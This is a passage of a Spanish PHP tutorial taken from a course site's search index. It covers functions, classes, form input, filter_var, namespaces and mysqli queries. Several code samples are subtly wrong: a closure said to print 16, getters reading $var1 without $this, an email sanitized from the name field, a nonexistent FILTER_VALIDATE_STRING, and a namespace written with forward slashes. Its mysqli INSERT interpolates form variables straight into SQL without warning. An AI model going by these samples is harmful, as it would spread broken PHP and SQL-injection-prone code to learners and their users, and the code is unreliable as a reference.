pasan por valor. Por si hay algún despistado/a: pasar argumentos por valor significa que PHP copiará en el parámetro de la función el valor de la variable con la que se invoca a dicha función, pero serán dos variables distintas. Si modificamos un parámetro dentro del código de la función, la variable con la que fue invocada no se verá afectada. Veámoslo con un ejempolo. Esta es una función con dos argumentos: . function calcular_iva($base, $porcentaje) { $total = $base * $porcentaje / 100; return $total; } . Para invocar a esta función, haremos algo como esto en algún otro punto del código fuente: . $iva = $calcular_iva($precio_del_articulo, 21); . En esta ocasión, hemos invocado a la función $calcular_iva() con dos parámetros: una variable ($precio_del_articulo) y una constante literal (21). Ambos parámetros se pasan por valor a la función. Eso significa que el valor de $precio_del_articulo se copia en el parámetro $base, y el valor del literal 21 se copia en $porcentaje. Cualquier modificación de $base o $porcentaje que pudiera producirse dentro del código de la función, no afectaría para nada a las variables originales ($precio_del_articulo y el literal 21). Por último, la función devuelve un valor mediante su return y ese valor se asigna a la varible $iva. Si esto del paso de parámetros por valor sigue sonándote a chino, quizá deberías repasar tus conocimientos sobre fundamentos de programación. Busca en internet algo como “paso de parametros por valor y por referencia” y dedica un rato a desentrañar los misterios del paso de parámetros antes de continuar. Definir el tipo de los argumentos . Desde PHP7, se puede definir el tipo de los argumentos de cualquier función: . function calcular_iva(float $base, float $porcentaje) { ... } . Esto es completamente optativo. Ahora bien, si defines el tipo de los argumentos y luego le pasas a la función un argumento de otro tipo, obtendrás un error de ejecución TypeError, como es lógico. Definir el tipo de la función . Desde PHP7 también se puede, optativamente, definir el tipo de datos que devolverá la función en el return: . function calcular_iva(float $base, float $porcentaje): float { ... } . Esto provocará que se evalúe de forma estricta el tipo de datos durante la invocación a la función y que se puedan producir errores de tipo (TypeError) en tiempo de ejecución, como es natural. Argumentos con valor predefinido . Algo muy útil que nos ofrece PHP es la posibilidad de asignar un valor por defecto a los argumentos de las funciones. Observa este ejemplo: . function calcular_iva($base, $porcentaje = 0.21) { ... } . El argumento $porcentaje tiene un valor por defecto, 0.21. Eso significa que podemos invocar esta función de dos maneras: . $a = calcular_iva(1000, 0.04); // Calculará el IVA de 1000 euros con un porcentaje del 4% $b = calcular_iva(1000); // Calculará el IVA de 1000 euros con un porcentaje del 21% . Como ves, en la primera invocación pasamos un valor para el argumento $porcentaje (0.04), por lo que ese argumento tomará ese valor. En cambio, en la segunda invocación nos olvidamos del segundo parámetro. Eso provocaría un error de ejecución en muchos lenguajes de programación, ¿verdad? Bueno, pues PHP lo ejecutará sin problemas, porque le hemos asignado un valor por defecto a $porcentaje. Eso significa que, si no le pasamos ningún valor, el argumento tomará su valor por defecto (0.21), y la función se ejecutará con ese valor asignado a esa variable. Funciones anónimas o closures . Javascript ha extendido como una plaga el uso de las funciones anónimas o closures. Se trata de funciones que no tienen nombre y que se usan directamente en una asignación a una variable o como parámetro de otra función. Yo tengo una opinión muy radical al respecto: las funciones anónimas hacen el código mucho más ilegible y su uso debería restringirse al máximo. Pero tienes que saber que esta no es una opinión mayoritaria, al menos actualmente. Las funciones anónimas deberían usarse solo cuando la función en cuestión no va a invocarse nunca desde ningún otro punto del programa: el hecho de no asignarles nombre hace que su código no sea reutilizable. Aquí puedes ver un ejemplo sencillo de función anónima: . $numero = 8; $doble = function(int $numero) { return $numero * 2; } echo $doble; // Imprimirá 16 . include y require . Cuando desarrollamos mucho código, a menudo colocamos colecciones de funciones (llamadas bibliotecas) en archivos diferentes que el resto del código. Para usar una función definida en otro archivo, necesitamos incluir ese código en nuestro archivo actual. Eso se hace con include y require: . | include se utiliza para incluir el código fuente de la biblioteca en nuestro archivo actual. Si la biblioteca no se encuentra, se produce un error de ejecución, pero el script actual continúa ejecutándose. | require también se utiliza para incluir el código fuente de la biblioteca en nuestro archivo actual. Pero si la biblioteca no se encuentra, se produce un error de ejecución y el script actual se detiene. | . Las variantes include_once y require_once se utilizan para evitar las inclusiones repetidas de código. Estas suelen ocurrir cuando nuestro programa es muy grande y varios scripts incluyen las mismas bibliotecas. Para prevenir errores por redefinición de funciones, se usa include_once o require_once: . include_once \"mi_biblioteca.php\"; // Incluye las funciones del archivo mi_biblioteca.php . El uso de include y require está en retroceso gracias a los espacios con nombre de las versiones recientes de PHP. Más adelante hablaremos de ellos. 2.3.8. Clases y objetos . A partir de la versión 5, PHP incluyó un completo soporte para orientación a objetos. Las clases, métodos y atributos se declaran de forma muy semejante a C++ y Java. Declaración de clases . En este ejemplo puedes ver cómo se declara una clase en PHP. Observa cómo se indica la herencia (extends) y cómo se declara el constructor (__construct()): . class MiClase extends ClaseMadre { // Declaración de propiedades (atributos) public $var1 = 'soy una variable pública de instancia'; private $var2 = 'y yo soy otra variable de instancia, pero privada'; // Método constructor (siempre se llama __construct) public function __construct($valor) { $this-&gt;var2 = $valor; } // Declaración de un método público public function mostrarVar() { echo $this-&gt;var2; } // Declaración de un método privado private function resetVar() { $this-&gt;var2 = ''; } public function otroMetodo() { // ...etc... } } . Algo que suele llamar la atención de los programadores que vienen de Java u otros lenguajes semejantes es que PHP no utiliza la notación punto para acceder a los miembros de una clase, sino la notación flecha (-&gt;). Por eso en el ejemplo anterior ves cosas como $this-&gt;var en lugar de this.var . Instanciación de objetos . Para instanciar un objeto de una clase, se usa la palabra new. El constructor puede llevar parámetros o no, como en Java. En el ejemplo anterior, el constructor tenía un argumento, así que new se usará así: . $miObjeto = new miClase('Estoy aprendiendo PHP'); $miObjeto-&gt;mostrarVar(); . La salida de este programa sería “Estoy aprendiendo PHP”. $this y parent . Como ya habrás supuesto, la variable $this se refiere siempre al objeto que está ejecutando el código, exactamente igual que en Java, Javascript y muchos otros lenguajes orientados a objeto. A veces, cuando tenemos una jerarquía de clases y unas heredan de otras, necesitamos invocar algún método de la clase madre o superclase. En ese caso, usaremos la palabra parent seguida de la notación cuatro puntos (::). Observa cómo se hace en este ejemplo, en el que el constructor de la subclase invoca al constructor de la superclase: . class MiClase { private $var1; public function __construct($param) { $this-&gt;var1 = $param; } } class MiSubclase extends MiClase { private $var2; public function __construct($param1, $param2) { $this-&gt;var2 = $param2; parent::__construct($param1); // Llamada a un método de la superclase } } . Miembros públicos, privados y protegidos . En PHP, mientras no se indique otra cosa, todos los miembros de una clase se considerarán públicos (public). Como en Java, existen tres niveles de visibilidad que podemos escoger para cada atributo y cada método: . | public: ese método o atributo es accesible desde el exterior de la clase. | private: ese método o atributo solo puede usarse desde dentro de la clase. | protected: ese método o atributo puede usarse desde dentro de la clase o desde cualquier clase hija. | . Getters y setters . En PHP también es habitual, como en muchos lenguajes de programación, que los atributos sean a menudo privados y que existan métodos getters y setters que se encarguen de manipularlos adecuadamente, sin que se acceda a los datos de los objetos desde el exterior. Esto es esencial para que los objetos funcionen como “cajas negras”. Los getters suelen devolver el valor de un atributo, pero los setters, en otros lenguajes, no devuelven nada. Sin embargo, en PHP es costumbre que los setters devuelvan el objeto completo, es decir, que terminen con un return $this. Así: . class MiClase { private $var1 = \"Esto es un atributo privado\"; // Getter public function getVar1() { return $var1; } // Setter public function setVar1($value) { $var1 = $value; return $this; // Devolvemos el objeto al terminar } } . Si lo hacemos así, estaremos creando lo que se llama un fluent interface o interfaz fluido, que es una forma rebuscada de decir que podremos encadenar varias invocaciones a métodos del objeto en una sola instrucción, algo que permite que el código se vea más organizado y legible. Para que veas en qué consiste el fluent interface, vamos a poner un ejemplo. Imagina que la clase anterior tuviera más atributos ($var1, $var2, $var3, etc), cada uno con sus respectivos setters. La forma tradicional de invocarlos todos sería algo así: . $obj = new MiClase(); $obj-&gt;setVar1($valor1); $obj-&gt;setVar2($valor2); $obj-&gt;setVar3($valor3); // etc. En cambio, si los setters devuelven this podemos usar un fluent interface y escribirlo así: . $obj = new MiClase(); $obj-&gt;setVar1($valor1) -&gt;setVar2($valor2) -&gt;setVar3($valor2); . Puede parecer un cambio insignificante, pero cuando los objetos son muy complejos, el código fluent se hace mucho más legible que el código tradicional. ¡Además, es gratis! . Clases abstractas e interfaces . Como en Java y otros lenguajes orientados a objetos, PHP también permite construir clases abstractas, que son clases que no se pueden instanciar. El objetivo de estas clases, como recordarás, es crear un molde a partir del cual puedan heredar otras clases que sí sean instanciables. Una clase abstracta se crea añadiendo la palabra abstract a la definición de la clase: . abstract class MiClase { ... } . También existen los interfaces, que son parecidos a las clases abstractas pero no pueden incorporar nada de código a los métodos. Es decir, se trata de una mera definición de métodos. Todas las clases que usen ese interfaz deben respetar e implementar esos métodos. Esto se hace cuando queremos que una colección de clases independientes proporcionen un conjunto de métodos homogéneos. Los interfaces se definen así: . interface MiInterface { public function unMetodo(); public function otroMetodo($parametro1, $parametro2); etc. } . Posteriormente, todas las clases que vayan a usar ese interface deben declararse de este modo: . class MiClase implements MiInterface { ... } . Métodos estáticos . Los métodos estáticos en PHP funcionan igual que en Java: se usan cuando una clase no tiene estado (es decir, no tiene atributos), o bien cuando ese método no tiene nada que ver con el estado de los objetos, sino que responde exactamente igual para todas las instancias. Los métodos estáticos se declaran así: . class MiClase { // Esto es un método estático public static function miMetodo() { ... } } . Para invocar un método estático, como es lógico, no es necesario instanciar ningún objeto. De hecho, si intentamos invocarlo a través de un objeto, fallará. Estos métodos se invocan a través del nombre de la clase directamente, usando la notación cuatro puntos (::): . // Esto invocará el método estático del ejemplo anterior MiClase::miMetodo(); . 2.3.9. Salida de datos . PHP puede hacer salidas de datos como cualquier otro lenguaje de programación: puede enviar texto a una impresora p datos a un fichero. O puede dibujar ventanas y componentes en un entorno gráfico de usuario. Pero cuando PHP se ejecuta como parte de una aplicación web, nada de eso tiene sentido: esa salida se produciría en el servidor, y nosotros no estamos allí para verla. Nosotros estamos en nuestro cliente (navegador web), pidiendo al servidor que ejecute un programa PHP. En este contexto, la salida PHP tiene que ser siempre código HTML válido. Ese código HTML será recibido por tu navegador, interpretado y mostrado. Observa el uso de echo para producir una salida HTML desde este pequeño script PHP: . &lt;body&gt; &lt;?php echo \"Soy un script de PHP y estoy generando código HTML. Para demostrarlo voy a escribir &lt;strong&gt;esto en negrita&lt;/strong&gt;\" ?&gt; &lt;/body&gt; . Si guardas este archivo en tu servidor web y lo cargas desde un navegador web (escribiendo la dirección https://tu-servidor/nombre-del-archivo.php), encontrarás que el navegador web recibe el siguiente código como resultado: . &lt;body&gt; Soy un script de PHP y estoy generando código HTML. Para demostrarlo voy a escribir &lt;strong&gt;esto en negrita&lt;/strong&gt; &lt;/body&gt; . Es decir, han desaparecido las etiquetas de PHP, así como el echo, y lo que recibe el navegador es código HTML limpio e impoluto. De hecho, el navegador no sabe si ese código HTML lo ha escrito una persona o lo ha generado un programa en PHP, como es el caso. Y ese será tu objetivo: escribir programas capaces de generar código HTML que el navegador pueda recibir e interpretar. 2.3.10. Paso de parámetros por la URL . Las aplicaciones web pueden recibir parámetros a través de la propia URL de invocación del servidor. Imagina que tenemos este link en un documento HTML: . &lt;a href=\"pagina.php?variable1=valor1&amp;variable2=valor2&amp;etc…\"&gt; . Al hacer clic en él, pediremos al servidor que ejecute el programa cuyo código fuente está en el archivo pagina.php, ¿verdad? . Pues bien, ese programa pagina.php tendrá a su disposición unas variables llamadas “variable1, *variable2, etc, que son las que han viajado hasta el servidor en la URL. Para acceder a esas variables, PHP utiliza un array global llamado $_GET, que se indexa con el nombre de las variables. Así: . &lt;?php echo \"La variable 2 vale:\".$_GET['variable2'].\"&lt;br&gt;\"; ?&gt; . Observa el uso del carácter punto (.) para concatenar strings en la salida de echo. Esto, en Java y muchos otros lenguajes, se haría con el carácter más (+). PHP es un poquito especial en este detalle. 2.3.11. Entrada de datos a través de formulario . Como PHP se ejecuta dentro de HTML, sólo puede recibir datos del usuario de la aplicación a través del navegador web. Y sólo hay una forma de introducir datos en una página web: a través de un formulario. Veámoslo con un ejemplo. Supongamos que hemos definido en HTML este sencillo formulario: . &lt;body&gt; &lt;form method=\"post\" action=\"destino.php\"&gt; Nombre&lt;br/&gt; &lt;input type=\"text\" name=\"nombre\"&gt;&lt;br/&gt; Apellidos&lt;br&gt; &lt;input type=\"text\" name=\"apellidos\"&gt;&lt;br/&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; &lt;/body&gt; . Al pulsar el botón “Enviar”, se cargará el script destino.php en el servidor. Ese script recibirá dos variables HTML llamadas nombre y apellido, con el valor que el usuario haya introducido en el formulario. Para acceder a las variables HTML, se usa el array del sistema $_POST, indexándolo con el nombre de la variable: . &lt;?php echo \"La variable nombre vale\".$_POST['nombre'].\"&lt;br&gt;\" ?&gt; . Observa que $_POST es una variable semejante a $_GET. Puedes utilizar una u otra según el valor del atributo method de tu formulario HTML. La variable $_REQUEST sirve tanto para POST como para GET. Por eso será la que nosotros usaremos preferentemente en nuestros programas. 2.3.12. Validación y saneamiento de formularios . Los datos que llegan desde un formulario son una fuente inagotable de quebraderos de cabeza. Para empezar, casi todos los ataques a las aplicaciones web provienen de intentos de los atacantes de usar los formularios como puerta de entrada al servidor. Y no hay que menospreciar el caos que puede provocar en una aplicación un usuario bienintencionado pero torpe que envía al servidor cosas totalmente imprevistas a través de un formulario. Por lo tanto, todo lo que los usuarios de la aplicación escriban en un formulario debe filtrarse: . | En el cliente, usando los atributos HTML5 necesarios y, si hace falta, recurriendo a Javascript. | En el servidor, mediante PHP o el lenguaje de servidor que estemos usando. | . Ese filtro puede ser algo muy simple, como eliminar todos los caracteres no alfabéticos que provengan del formulario, o algo más complejo, como comprobar que el usuario ha escrito una dirección de email bien formada. Ese proceso de filtrado se denomina validación y saneamiento. Para ayudarnos en esta validación, PHP proporciona la función filter_var(), que limpia diferentes conjuntos de caracteres sospechosos de cualquier dato que provenga del formulario. Esta función recibe como parámetro un string y permite tanto sanearlo como validarlo. Por ejemplo, supongamos que tenemos un sencillo formulario con dos campos, nombre y email: . &lt;form action='procesa_formulario.php'&gt; &lt;input type='text' name='nombre'&gt; &lt;input type='text' name='email'&gt; &lt;button type='submit'&gt;Enviar&lt;/button&gt; &lt;/form&gt; . El script procesa_formulario.php recibirá los datos enviados por este formulario (nombre y email) en las variables $_REQUEST[“nombre”] y $_REQUEST[“email”]. Pues bien, si queremos sanear (limpiar) cualquier carácter sospechoso que pueda venir en esas variables, podemos hacerlo así: . if (!isset($_REQUEST[\"nombre\"])) { echo \"Error: el campo nombre es obligatorio\"; } if (!isset($_REQUEST[\"email\"])) { echo \"Error: el campo email es obligatorio\"; } $nombre = filter_var($_REQUEST[\"nombre\"], FILTER_SANITIZE_STRING); $email = filter_var($_REQUEST[\"nombre\"], FILTER_SANITIZE_STRING); . Tras la ejecución de este código nos habremos asegurado de que el usuario ha rellenado los dos campos y que esos campos no contienen ningún carácter sospechoso de ataque. filter_var() admite otros valores como segundo parámetro. Son estos: . | FILTER_SANITIZE_STRING: elimina cualquier etiqueta HTML que encuentre en el string. | FILTER_SANITIZE_NUMBER_INT: elimina cualquier carácter que no sea numérico (solo respeta los caracteres “+” y “-“) | FILTER_SANITIZE_URL: elimina cualquier carácter que no forme parte de una URL. El decir, solo deja las letras, los números y algunos caracteres especiales como _, : o ? | FILTER_SANITIZE_EMAIL: elimina cualquier carácter que no forme parte de una dirección de email típica. | . Si solo queremos validar un string procedente de un formulario, podemos cambiar los valores anteriores por FILTER_VALIDATE_STRING, FILTER_VALIDATE_NUMBER_INT, etc. Es decir, cambiaremos la palabra SANITIZE por VALIDATE. De ese modo, la función filter_var() no cambiará el string, sino que comprobará si pasa el filtro o no y nos devolverá true o false. Existen otros filtros más complejos que puedes consultar en la referencia oficial del lenguaje. Y, por supuesto, para construir validaciones más específicas, siempre puede programarlas por tu cuenta y riesgo, usando las funciones de procesamiento de strings que te ofrece PHP y currándotelo un poco. 2.3.13. Namespaces . Cuando las aplicaciones se hacen muy complejas pueden llegar a usar muchísimas clases (tanto nuestras como de librerías) y antes o después nos encontramos con problemas de redefinición. Es decir: dos clases, dos métodos o dos funciones que se llaman igual pero que pertenecen a librerías diferentes. Los namespaces o espacios con nombre permiten organizar clases mediante nombres descriptivos, igual los archivos se organizan en carpetas. ¿Verdad que puedes tener dos archivos que se llamen igual en dos lugares distintos de tu disco duro? Pues eso mismo. Por ejemplo, podemos tener una clase llamada Planta para manejar las existencias de plantas vegetales de un centro comercial, y una clase diferente llamada también Planta que se refiera a los diferentes pisos del centro comercial. Cada clase estaría dentro de un namespace diferente, y así no se confundirían. Para asignar una clase (o lo que sea) a un espacio con nombres, basta con indicarlo al principio del archivo que contiene esa clase, así: . namespace vegetales . Cualquier clase o función que se declare en este archivo pertenecerá al namespace “vegetales”. Para mantener un código limpio y bien organizado, lo habitual es escribir una sola clase en cada archivo, y colocar esos archivos en subcarpetas que tengan el mismo nombre que el namespace. De hecho, los namespaces de los sistemas complejos suelen incluir una jerarquía de carpetas que se indica así: . namespace Persona\\Empleado . El archivo que comience de ese modo debería contener el código fuente de una clase llamada también Empleado, y el propio archivo debería llamarse empleado.php y localizarse en una subcarpeta llamada persona/empleado. ¿Y cómo se usa una clase localizada en un namespace? Muy sencillo: indicaremos el namespace que queremos utilizar mediante la instrucción use: . include_once(\"Persona/Empleado/empleado.php\"); // Esto incluye el código fuente de la clase Empleado use Persona/Empleado/Empleado; // Esto indica el namespace que queremos utilizar $emp = new Empleado(); // ¡Y ya tenemos disponible la clase Empleado! . 2.3.14. Extensiones de PHP y referencia del lenguaje: cómo usar la biblioteca del lenguaje sin volverse loco . Para terminar con esta introducción a PHP, no podemos dejar de hablar de las bibliotecas de clases y funciones que vienen con cualquier distribución del lenguaje. PHP dispone, literalmente, de miles de funciones y métodos disponibles para usar con nuestros programas. Estas funciones y métodos resuelven casi cualquier problema común concebible. Como la biblioteca de PHP es tan grande, los administradores del servidor deben decidir qué funciones y clases están disponibles activando o desactivando extensiones de PHP, que es una forma rebuscada de referirse a las bibliotecas del lenguaje. Cuando un servidor tiene activada una determinada extensión de PHP, todas sus funciones y métodos están disponibles para nuestros programas. Es imposible conocer toda esa vasta colección de funciones, clases y métodos. Para eso está la referencia oficial del lenguaje, que puedes encontrar en https://www.php.net/manual . Por ejemplo, existen muchas funciones para manipular strings. Imagina que un día necesitas convertir todos los caracteres de un string a mayúsculas. Parece razonable suponer que, si las bibliotecas de PHP son tan grandes, exitirá una función que pueda hacer eso por nosotros. ¿Cómo la localizamos? . Mi consejo es que acudas siempre a https://www.php.net/manual y allí utilices el buscador. Por ejemplo, teclea en la caja de búsqueda la palabra “strings”. En la página de resultados obtendrás una lista con todas las funciones relativas a strings. La función que estamos buscando debe incluir la palabra “upper”. Una rápida búsqueda por la página de resultados te conducirá a la función strtoupper(), que es justo la que estábamos buscando. Si accedes a la página de strtoupper() encontrarás una completa descripción de la función y, lo que es más importante, algunos ejemplos de código que puedes copiar, pegar y adaptar a tu caso concreto. Si, por alguna razón, decides buscar información sobre las biblioteca de PHP fuera de la web oficial, asegúrate que el sitio es de confianza y que la información que ofrece está actualizada: hay muchos sitios web que proporcionan soluciones obsoletas, inseguras o directamente erróneas. ",
    "url": "https://iescelia.org/docs/dwes/_site/php/sintaxis-de-php.html#23-la-sintaxis-de-php",
    "relUrl": "/php/sintaxis-de-php.html#23-la-sintaxis-de-php"
  },"7": {
    "doc": "2.3 Sintaxis de PHP",
    "title": "2.3 Sintaxis de PHP",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/php/sintaxis-de-php.html",
    "relUrl": "/php/sintaxis-de-php.html"
  },"8": {
    "doc": "2.4 Interacción con la base de datos",
    "title": "2.4. Interacción entre MariaDB y PHP",
    "content": ". | 2.4.1. MySQL/MariaDB con PHP4 | 2.4.2. MySQL/MariaDB a partir de PHP5 | . A partir de ahora, vamos a referirnos a MySQL/MariaDB indistintamente. Este será el gestor de bases de datos relacionales que vamos a usar a lo largo del curso. La adaptación a otros gestores, en cualquier caso, es muy simple. MySQL/MariaDB, como ya hemos visto, es un SGBD relacional de probada eficacia. La interacción con él resulta eficiente y segura para casi cualquier aplicación web que podamos concebir. Hay básicamente tres métodos de utilizar MySQL/MariaDB: . | A través de un cliente de línea de comandos: . El cliente mysql de línea de comandos puede ser tu tabla de salvación en más de una ocasión. Cuando todo lo demás se ha caído, este cliente todavía suele responder, así que más te vale saber defenderte con él. Como viste en primer curso, basta con abrir una sesión MySQL escribiendo esto: . $ mysql -h servidor -u nombre_usuario -p . Y luego tenemos a nuestra disposición montones de comandos para hacer cosas con la base de datos, incluyendo ejecutar cualquier instrucción válida en SQL. | A través de un cliente con interfaz gráfico, como MysqlWorkBench o PHPMyAdmin. Esta últiam es una aplicación web escrita en PHP que proporciona un interfaz bastante cómodo para trabajar con MySQL o MariaDB. Como suele estar presente en casi todos los servidores web, te aconsejo que, si no la conoces, la uses a partir de ahora porque te la vas a encontrar a menudo en tu vida profesional. | A través de un programa escrito en PHP o algún otro lenguaje con posibilidad de acceso a MySQL. Este método de acceso será el que nosotros usaremos en nuestros programas para convertirlos en auténticas aplicaciones web. | . En esta sección, vamos a ver lo fundamental para usar MySQL desde un programa en PHP. Iremos perfeccionando nuestras habilidades al respecto a lo largo del resto del curso. 2.4.1. MySQL/MariaDB con PHP4 . Si PHP4 está obsoleto, ¿por qué hay un apartado dedicado al acceso a MySQL desde PHP4? . Buena pregunta. La respuesta es simple: para que sepas lo que NO tienes que hacer. El hecho es que encontrarás aún mucho código PHP4 pululando por internet. Los sitios donde haya código de ese estilo deben ser evitados. Suele tratarse de blogs antiguos, tutoriales obsoletos o, simplemente, gente ignorante con ganas de ayudar pero que anda bastante perdida. Acceso a MySQL con PHP4 (¡OBSOLETO!) . El modo en que se accedía a bases de datos en PHP4 era mediante bibliotecas de funciones diferentes para cada SGBD. Lo digo otra vez: esta forma de programar está obsoleta y se desaconseja su uso. No tiene soporte oficial. Si aparecen problemas de seguridad o estabilidad, nadie los va a resolver. Si encuentras código de este estilo en internet, lárgate de ese sitio, porque no vas a aprender nada útil. PHP4 utilizaba una biblioteca de funciones PHP cuyo nombre empiezaba por las letras mysql_. Por ejemplo, para insertar un registro en una BD MySQL, se hacía así: . &lt;?php // Conectamos con MySQL mysql_connect(\"URL\",\"nombre_usuario\",\"contraseña\"); // Seleccionamos la base de datos con la que vamos a trabajar mysql_select_db(\"nombre_base_de_datos\"); // Ejecutamos una sentencia SQL mysql_query(\"INSERT INTO clientes (nombre,telefono) VALUES ('$nombre','$telefono')\"); ?&gt; . Y para ejecutar consultas (SELECT), se hacía más o menos como en este ejemplo. No es necesario que lo entiendas todo. Basta con que te hagas una idea de la manera en la que trabajaba PHP4 para que sepas identificarlo si te lo encuentras por ahí: . &lt;?php //Nos conectamos con MySQL mysql_connect(\"URL\",\"user\",\"password\"); //Seleccionamos la base de datos con la que vamos a trabajar mysql_select_db(\"nombre_base_datos\"); //Ejecutamos la consulta SQL para obtener toda la tabla de Clientes $result=mysql_query(\"SELECT * FROM Clientes\"); ?&gt; &lt;table align=\"center\"&gt;&lt;tr&gt; &lt;th&gt;Nombre&lt;/th&gt; &lt;th&gt;Teléfono&lt;/th&gt;&lt;/tr&gt; &lt;? //Mostramos los nombres y teléfonos de los clientes while ($registro=mysql_fetch_array($result)) { echo '&lt;tr&gt;&lt;td&gt;'.$registro[\"nombre\"].'&lt;/td&gt;'; echo '&lt;td&gt;'.$registro[\"telefono\"].'&lt;/td&gt;&lt;/tr&gt;'; } mysql_free_result($result) ?&gt; &lt;/table&gt; &lt;/body&gt; . 2.4.2. MySQL/MariaDB a partir de PHP5 . Desde PHP5, se utiliza una biblioteca de clases para acceder a los diferentes SGBDs. Todos los nuevos desarrollos deberían usar las bibliotecas de clases y prescindir de las viejas librerías de funciones. Vuelvo a repetirlo: mucho código de ejemplo de PHP que circula por la red es PHP4 y DEBE SER EVITADO. Formas de acceder a bases de datos en PHP . PHP proporciona varios mecanismos para acceder a bases de datos (ya te lo dije antes: en PHP, casi todo se puede hacer de varias maneras distintas): . | Forma 1: Usar la extensión mysqli en su forma procedimental. Esta forma recuerda mucho a PHP4, pero cambiando la palabra “mysql” por “mysqli”. Por ejemplo, la función mysql_connect() ahora se llama mysqli_connect() (la “i” significa “improved”, es decir, “mejorado”). Esta forma es apta para programadores/as perezosos y anticuados, que no quieren pasarse a la programación orientada a objetos y se sienten cómodos con la forma de codificación tradicional. Pero ese no es tu caso, ¿verdad? Así que nunca utilizaremos la forma procedimental. | Forma 2: Usar la extensión mysqli en su forma orientada a objetos. Se accede a la base de datos a través de un objeto de la clase mysqli. Es decir, se crea una instancia (con new mysqli()) y, a través de ella, se tiene acceso a todos los métodos para interactuar con la base de datos. Si en lugar de una base de datos MySQL, trabajamos con otro gestor de base de datos, hay que crear un objeto de otro tipo. Por ejemplo, la clase SQLite3 sirve para conectar con bases de datos SQLite. Hay otros gestores que solo ofrecen la forma procedimental. Nosotros, como somos muy modernos, usaremos esta forma de conectar a MySQL durante el resto de este texto. | Forma 3: Usar la extensión PDO. A partir de PHP 5.1, existe una clase genérica, llamada PDO, que permite acceder a cualquier gestor de bases de datos mediante el mismo conjunto de métodos. Es lo que se llama una capa de abstracción de acceso a datos . Esto significa que, independientemente de la base de datos que se esté utilizando, PDO permite utilizar los mismos métodos para realizar consultas y obtener datos, por lo que es una forma de trabajo perfectamente válida y que podríamos haber usado en lugar de la extensión mysqli. | . Inserción, modificación y borrado de datos . Vamos a ver cómo funciona la clase mysqli mediante unos cuantos ejemplos. En primer lugar, lanzaremos una inserción de datos. Imagina que tenemos una base de datos MySQL o MariaDB llamada mi-base-de-datos que contiene una tabla de clientes donde guardamos, entre otras cosas, los nombres y los teléfonos de los clientes. Insertar un registro en esa tabla desde PHP se logra en solo dos pasos: . &lt;?php // Conectamos con el servidor y abrimos la BD $conexdb = new mysqli('servidor','nombre-de-usuario','password','mi-base-de-datos'); // Insertamos un registro en una tabla (aquí se podría escribir cualquier sentencia SQL válida) $conexdb-&gt;query(\"INSERT INTO clientes (nombre,telefono) VALUES ('$nombre','$telefono')\"); ?&gt; . Si sustituyes la sentencia INSERT por cualquier otra instrucción SQL válida, también funcionará. Con una excepción: SELECT se ejecuta de otra manera que enseguida veremos. Por lo tanto, el código anterior te puede servir de base para ejecutar cualquier INSERT, UPDATE o DELETE sobre tu base de datos. O incluso sentencias de definición de la base de datos, como CREATE TABLE o ALTER TABLE (siempre que el usuario con el que te estés conectando tenga permisos para ejecutarlas, claro) . Consultas . Hemos dicho que las sentencias SELECT se lanzan desde PHP de un modo diferente al resto. ¿Por qué será? . La respuesta es sencilla de entender: la ejecución de consultas (SELECT) produce la devolución de un conjunto de registros, mientras que cualquier otra instucción (INSERT, UPDATE, DELETE o lo que sea) no devuelve ningún registro. Los registros obtenidos como resultado de un SELECT se manejan en PHP con un objeto denominado cursor. Un cursor no es más que un puntero al conjunto de resultados que señala al registro que se va a procesar a continuación. Es decir: se parece al cursor de tu procesador de textos, que te indica el lugar en el que vas a insertar o borrar caracteres. En el caso de los cursores MySQL, no te permiten borrar nada. El cursor solo señala un registro concreto dentro de los resultados del SELECT. Observa cómo se hace un SELECT en este ejemplo: . &lt;body&gt; &lt;?php //Nos conectamos con MySQL $db = new mysqli(\"servidor\",\"user\",\"password\", \"database\"); // Comprobamos que la conexión se ha realizado if($db-&gt;connect_error){ die(\"Error en la conexion : \".$db-&gt;connect_error); } //Ejecutamos la consulta SQL $result=$db-&gt;query(\"SELECT * FROM Clientes\"); ?&gt; &lt;table align=\"center\"&gt;&lt;tr&gt; &lt;th&gt;Nombre&lt;/th&gt; &lt;th&gt;Teléfono&lt;/th&gt;&lt;/tr&gt; &lt;? //Mostramos los registros de SELECT while ($registro=$result-&gt;fetch_array()) { echo '&lt;tr&gt;&lt;td&gt;'.$registro[\"nombre\"].'&lt;/td&gt;'; echo '&lt;td&gt;'.$registro[\"telefono\"].'&lt;/td&gt;&lt;/tr&gt;'; } $db-&gt;free($result); // Libera memoria usada por cursor $db-&gt;close(); // Cierra la conexión con el servidor ?&gt; &lt;/table&gt; &lt;/body&gt; . Probablemente ya lo hayas captado sin necesidad de explicaciones adicionales, pero, por si acaso no es así, ahí va una explicación adicional gratuita. Cuando se lanza una consulta contra una base de datos desde PHP, la base de datos nos devuelve el resultado en un cursor, como hemos dicho. Ese objeto de tipo cursor lo almacenamos en una variable que, en este ejemplo, hemos llamado $result. Recuerda que un cursor es un apuntador a un conjunto de resultados. Cuando un cursor está recién abierto, siempre apunta al primer registro de ese conjunto de resultados. Nuestra variable result es un objeto (su clase se llama mysqli_result, por cierto). Y, como cualquier objeto, contiene una serie de métodos. Entre esos métodos, cualquier cursor siempre nos ofrecerá un método importantísimo llamado fetch() o algo semejante. El método fetch() hace lo siguiente: nos devuelve el siguiente dato almacenado en el cursor (en nuestro caso, un registro completo) y hace avanzar al cursor para que apunte al siguiente dato (en nuestro caso, el siguiente registro). Así, lo deja preparado para recuperar otro registro en la siguiente iteración. Por eso hemos colocado la instrucción fetch() en un bucle. Ahora todo empieza a encajar, ¿verdad? . Cuando el cursor está recién abierto, el primer fetch() nos devuelve el primer registro del resultado. Es decir, el primer cliente. Podemos acceder a los campos de ese registro (como “nombre” o “teléfono”) accediendo al registro como si fuera un array ($registro[“nomnre”], $registro[“telefono”], etc). Por eso el método no se llama solo fetch(), sino fetch_array(). Pero fetch() no solo recupera el primer registro, sino que hace avanzar el cursor para que se quede apuntando al segundo. De este modo, en la siguiente iteración del bucle, fetch_array() nos recupera el segundo registro (el segundo cliente), y el cursor queda apuntando al tercero, listo para la siguiente iteración. Cuando no quedan más registros que procesar, fetch() devuelve false y el bucle termina. De ese modo, habremos procesado fácilmente todo el conjunto de resultados devueltos por la consulta. El método fetch() tiene varias formas. Nosotros usaremos sobre todo estas dos: . | fetch_array(), como en el ejemplo anterior. Cada registro del resultado tiene forma de array. Para acceder, por ejemplo, al nombre de un cliente, escribimos algo como $registro[\"nombre\"]. | fetch_object(), que funciona igual, pero cada registro del 